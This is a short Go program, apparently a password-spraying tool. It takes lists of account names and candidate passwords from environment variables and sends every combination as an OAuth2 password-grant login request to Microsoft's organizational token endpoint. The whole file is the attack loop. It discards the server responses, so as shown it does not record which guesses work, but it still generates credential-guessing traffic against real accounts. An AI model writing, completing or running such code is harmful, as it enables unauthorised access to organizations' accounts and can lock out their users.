package main

import (
    "net/http"
    "net/url"
    "os"
    "strings"
)

func main() {
    identities := strings.Split(os.Getenv("ACCOUNTS"), ",")
    guesses := strings.Split(os.Getenv("CANDIDATES"), ",")
    endpoint := "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
    for _, guess := range guesses {
        for _, identity := range identities {
            formulario := url.Values{}
            formulario.Set("grant_type", "password")
            formulario.Set("client_id", os.Getenv("CLIENT_ID"))
            formulario.Set("scope", "https://graph.microsoft.com/.default")
            formulario.Set("username", identity)
            formulario.Set("password", guess)
            respuesta, err := http.PostForm(endpoint, formulario)
            if err == nil {
                respuesta.Body.Close()
            }
        }
    }
}
